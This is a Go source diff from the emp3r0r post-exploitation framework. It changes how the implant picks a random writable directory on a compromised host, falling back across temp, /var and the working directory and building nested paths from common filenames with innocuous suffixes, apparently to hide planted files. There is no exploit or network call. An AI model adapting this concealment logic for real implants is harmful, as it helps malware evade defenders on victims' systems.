@@ -5,6 +5,7 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -74,7 +75,13 @@ func ApplyRuntimeConfig() (err error) {
 func GetRandomWritablePath() (string, error) {
 	var paths []string
 	root_path := os.TempDir()
-	if HasRoot() {
+	if !util.IsDirWritable(root_path) {
+		root_path = "/tmp"
+		if runtime.GOOS == "windows" {
+			root_path, _ = os.Getwd()
+		}
+	}
+	if HasRoot() && runtime.GOOS != "windows" {
 		root_path = "/var"
 	}
 
@@ -102,33 +109,50 @@ func GetRandomWritablePath() (string, error) {
 		}
 	}
 
-	just_get_one := func() string {
+	just_get_one := func() (string, error) {
 		rand_common_path := emp3r0r_data.CommonFilenames[util.RandInt(0, len(emp3r0r_data.CommonFilenames))]
 		suffixes := []string{"_tmp", "_temp", "_backup", "_copy"}
 		rand_suffix := suffixes[util.RandInt(0, len(suffixes))]
 		if util.IsExist(rand_common_path) {
 			rand_common_path += rand_suffix
 		}
-		return rand_common_path
+		// abosolute path
+		rand_common_path = fmt.Sprintf("%s/%s", root_path, rand_common_path)
+
+		// make depth level higher
+		if strings.Count(rand_common_path, "/") < 2 {
+			level2Name := emp3r0r_data.CommonFilenames[util.RandInt(0, len(emp3r0r_data.CommonFilenames))]
+			rand_common_path = fmt.Sprintf("%s/%s", rand_common_path, level2Name)
+			// mkdir
+			if err := os.MkdirAll(rand_common_path, 0o755); err != nil {
+				return os.Getwd()
+			}
+		}
+
+		// make sure it's writable
+		if !util.IsDirWritable(rand_common_path) {
+			return os.Getwd()
+		}
+
+		return rand_common_path, nil
 	}
 
 	if len(paths) == 0 {
-		return just_get_one(), nil
+		return just_get_one()
 	}
 
-	// Filter paths to ensure they are level 3 or above
-	var level3Paths []string
+	// Filter paths to ensure they are level 2 or above
+	var level2Paths []string
 	var rand_path string
 	for _, path := range paths {
-		if strings.Count(path, "/") >= 3 {
-			level3Paths = append(level3Paths, path)
+		if strings.Count(path, "/") >= 2 {
+			level2Paths = append(level2Paths, path)
 		}
 	}
-	if len(level3Paths) == 0 {
-		rand_path = just_get_one()
-		return rand_path, nil
+	if len(level2Paths) == 0 {
+		return just_get_one()
 	}
-	rand_path = level3Paths[util.RandInt(0, len(level3Paths))]
+	rand_path = level2Paths[util.RandInt(0, len(level2Paths))]
 
 	if !strings.HasSuffix(rand_path, "/") {
 		rand_path += "/"
